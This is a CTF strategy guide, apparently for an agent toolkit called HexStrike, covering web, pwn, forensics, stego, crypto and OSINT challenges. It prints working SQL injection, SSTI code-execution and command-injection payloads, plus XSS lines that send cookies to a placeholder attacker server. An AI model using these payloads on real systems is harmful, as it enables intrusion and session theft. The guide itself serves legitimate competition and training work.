# HexStrike CTF Challenge Strategy

Systematic approach to Capture The Flag competitions. Each challenge category
maps to specific HexStrike tool chains with exact parameters and technique
decision trees.

---

## General CTF Workflow

```
# Create a session per CTF event
create_scan_session(target="ctf-event-name",
                    metadata={"type": "ctf", "event": "event-name"})
```

**Universal first steps for any challenge:**
1. Read the challenge description carefully — note hints
2. Identify the category (web, pwn, forensics, crypto, misc)
3. Download any provided files
4. Check file type and metadata before anything else:
```
file_type_detect(file_path="challenge_file")
exiftool_extract(target="challenge_file")
strings_extract(target="challenge_file")
file_entropy(file_path="challenge_file")
```

---

## Web Exploitation

### Reconnaissance
```
# Identify the tech stack
detect_technologies_ai(target="http://challenge:port")
http_header_analysis(url="http://challenge:port")

# Directory discovery (CTF often hides endpoints)
gobuster_scan(target="http://challenge:port",
              wordlist="common.txt",
              extensions="php,txt,html,bak,old,zip,git")

# Check for .git exposure
http_repeater(url="http://challenge:port/.git/HEAD")
# If 200 → git repo exposed, download and reconstruct
```

### SQL Injection (Most Common CTF Web Vuln)
```
# Quick manual test via http_repeater
http_repeater(url="http://challenge:port/login",
              method="POST",
              body={"username": "admin' OR 1=1--", "password": "x"})

# Automated extraction
sqlmap_scan(target="http://challenge:port/login",
            data="username=admin&password=test",
            level=5, risk=3, technique="BEUST",
            dump=True)
```

**Common CTF SQLi patterns:**
- Login bypass: `admin' OR 1=1-- -`
- Union-based extraction: `' UNION SELECT 1,flag,3 FROM flags-- -`
- Blind boolean: `' AND (SELECT SUBSTRING(flag,1,1) FROM flags)='f'-- -`
- SQLite (common in CTFs): `' UNION SELECT 1,sql,3 FROM sqlite_master-- -`

### Server-Side Template Injection
```
# Test for SSTI
http_repeater(url="http://challenge:port/render",
              params={"name": "{{7*7}}"})
# If response contains 49 → SSTI confirmed

tplmap_scan(target="http://challenge:port/render?name=test")
```

**SSTI payloads by engine:**
| Engine | Detection | RCE Payload |
|--------|-----------|-------------|
| Jinja2 | `{{7*7}}` → 49 | `{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}` |
| Twig | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}` |
| Freemarker | `${7*7}` → 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /flag")}` |
| ERB | `<%= 7*7 %>` → 49 | `<%= system("cat /flag") %>` |

### XSS (Usually for Cookie Stealing)
```
dalfox_xss_scan(target="http://challenge:port/search?q=test",
                cookie="session=your_session")

# Common CTF XSS payloads:
# <script>document.location='http://your-server/?c='+document.cookie</script>
# <img src=x onerror="fetch('http://your-server/?c='+document.cookie)">
```

### Command Injection
```
commix_scan(target="http://challenge:port/ping?ip=127.0.0.1")

# Manual payloads:
# ; cat /flag
# | cat /flag
# $(cat /flag)
# `cat /flag`
```

### Deserialization
```
# PHP: Check for serialized data in cookies/params
# Look for: O:4:"User":2:{...} patterns
# Python pickle: Check for base64-encoded data

# Java deserialization
# Look for: rO0ABX... (base64) or AC ED 00 05 (hex)
```

---

## Binary Exploitation (Pwn)

### Initial Analysis
```
# Always start with these three
checksec_analyze(target="./binary")
→ Shows: RELRO, Stack Canary, NX, PIE, ASLR status

file_type_detect(file_path="./binary")
→ Architecture: x86, x64, ARM

strings_extract(target="./binary")
→ Look for: flag format, function names, format strings
```

### Static Analysis
```
# Disassemble and decompile
ghidra_analysis(target="./binary", analysis_type="decompile")

# Quick function listing
radare2_analyze(target="./binary", commands="afl")

# Find ROP gadgets (if NX enabled)
ropgadget_search(target="./binary")
ropper_gadget_search(target="./binary")
```

### Dynamic Analysis
```
# Debug with exploit-dev plugins
gdb_peda_debug(target="./binary", commands="checksec; pattern create 200")

# Find buffer overflow offset
# 1. Generate pattern: pattern create 200
# 2. Run binary with pattern as input
# 3. pattern offset <crash_address>
```

### Exploitation Decision Tree
```
IF checksec → No Canary + No NX:
  → Classic buffer overflow + shellcode
  → pwntools_exploit(target="./binary", exploit_type="bof")

IF checksec → No Canary + NX enabled:
  → Return-to-libc or ROP chain
  → ropgadget_search(target="./binary")
  → one_gadget_search(libc="./libc.so.6")
  → libc_database_lookup(leaked_address="<addr>", function="puts")

IF checksec → Canary + NX:
  → Need canary leak first (format string, info leak)
  → Then ROP

IF checksec → Full RELRO + PIE + Canary + NX:
  → Need info leak for PIE base + canary
  → Then ROP with leaked addresses

IF format string vulnerability found:
  → Read: arbitrary read via %s, %x
  → Write: arbitrary write via %n
  → Leak canary, PIE base, libc addresses
```

### Pwntools Quick Reference
```
pwntools_exploit(target="./binary",
                 host="challenge.ctf.com", port=1337,
                 exploit_type="rop",
                 payload=<crafted_payload>)
```

---

## Forensics

### File Analysis
```
# Step 1: What is it?
file_type_detect(file_path="evidence.bin")
exiftool_extract(target="evidence.bin")
file_entropy(file_path="evidence.bin")
→ High entropy (>7.5) suggests encryption or compression

# Step 2: Extract embedded files
binwalk_analyze(target="evidence.bin", extract=True)
foremost_carving(target="evidence.bin")
scalpel_carve(target="evidence.bin")
```

### Memory Forensics
```
# Identify the OS profile
volatility_analyze(target="memory.dmp", plugin="imageinfo")
# OR newer version:
volatility3_analyze(target="memory.dmp", plugin="windows.info")

# Common CTF memory forensics plugins:
volatility3_analyze(target="memory.dmp", plugin="windows.pslist")    # Process list
volatility3_analyze(target="memory.dmp", plugin="windows.cmdline")   # Command history
volatility3_analyze(target="memory.dmp", plugin="windows.filescan")  # Find files
volatility3_analyze(target="memory.dmp", plugin="windows.dumpfiles") # Extract files
volatility3_analyze(target="memory.dmp", plugin="windows.hashdump")  # Password hashes
volatility3_analyze(target="memory.dmp", plugin="windows.netscan")   # Network connections
```

### Network Forensics (PCAP)
```
# Extract files from PCAP — use external tools or:
strings_extract(target="capture.pcap")
→ Look for: HTTP requests, credentials, flag strings

# Common patterns in CTF PCAPs:
# - HTTP traffic with flag in response body
# - DNS exfiltration (flag encoded in subdomain queries)
# - FTP/Telnet with cleartext credentials
# - ICMP tunneling (flag in ICMP data)
```

### Disk Forensics
```
bulk_extractor_scan(target="disk.img")
→ Extracts: emails, URLs, credit cards, WiFi passwords

# Mount and analyze — check for deleted files
strings_extract(target="disk.img")
```

---

## Steganography

### Detection Flow
```
# Step 1: Check metadata for hints
exiftool_extract(target="image.png")

# Step 2: Visual analysis
file_entropy(file_path="image.png")
→ Unusually high entropy for image = likely stego

# Step 3: Try common tools
steghide_analysis(target="image.jpg", passphrase="")
steghide_analysis(target="image.jpg", passphrase="password")
zsteg_analyze(target="image.png")
outguess_extract(target="image.jpg")

# Step 4: LSB analysis (PNG/BMP)
zsteg_analyze(target="image.png")
→ Checks all LSB channels and bit planes

# Step 5: Check for appended data
binwalk_analyze(target="image.png")
strings_extract(target="image.png")
```

**Stego by file type:**
| Format | Tools | Common Techniques |
|--------|-------|-------------------|
| JPEG | `steghide_analysis`, `outguess_extract` | DCT coefficient hiding |
| PNG | `zsteg_analyze`, `binwalk_analyze` | LSB in RGB channels |
| BMP | `zsteg_analyze` | LSB, palette manipulation |
| WAV/MP3 | `steghide_analysis`, `strings_extract` | LSB in audio samples |
| PDF | `binwalk_analyze`, `strings_extract` | Embedded files, hidden text |

---

## Cryptography

### Identification
```
# What type of encoding/cipher?
hash_identifier_analyze(hash="<unknown_string>")
hashid_identify(hash="<unknown_string>")

# Common CTF encodings (try in order):
# Base64: strings with A-Za-z0-9+/= padding
# Base32: strings with A-Z2-7= padding
# Hex: 0-9a-f characters
# ROT13: alphabetic shift
# Binary/Octal: 0s and 1s / 0-7
```

### Hash Cracking
```
# Identify hash type first
hashid_identify(hash="5f4dcc3b5aa765d61d8327deb882cf99")
→ MD5

# Crack with wordlist
john_crack(hash_file="hashes.txt", wordlist="rockyou.txt")
hashcat_crack(hash_file="hashes.txt", mode=0, wordlist="rockyou.txt")

# Common hash modes for hashcat:
# 0 = MD5, 100 = SHA1, 1400 = SHA256
# 1000 = NTLM, 3200 = bcrypt, 1800 = sha512crypt
```

---

## OSINT / Reconnaissance Challenges

```
# Username OSINT
sherlock_investigate(username="target_username")
→ Searches 400+ platforms

# Domain intelligence
subfinder_scan(target="target-domain.com")
shodan_host_lookup(target="target-domain.com")
censys_host_lookup(target="target-domain.com")

# Email investigation
hibp_breach_check(email="target@email.com")
theharvester_scan(target="target-domain.com")

# Secret scanning (GitHub repos)
trufflehog_scan(target="https://github.com/target-org/repo")
```

---

## Speed Tips for CTF

1. **Always check strings first** — `strings_extract` catches low-hanging flags
2. **Check file headers** — `file_type_detect` reveals misnamed files
3. **Try obvious passwords** — empty string, "password", challenge name
4. **Read source code** — view-source on web challenges
5. **Check robots.txt, .git, .env** — common CTF hiding spots
6. **Use iterative_smart_scan for recon challenges** — fastest broad coverage
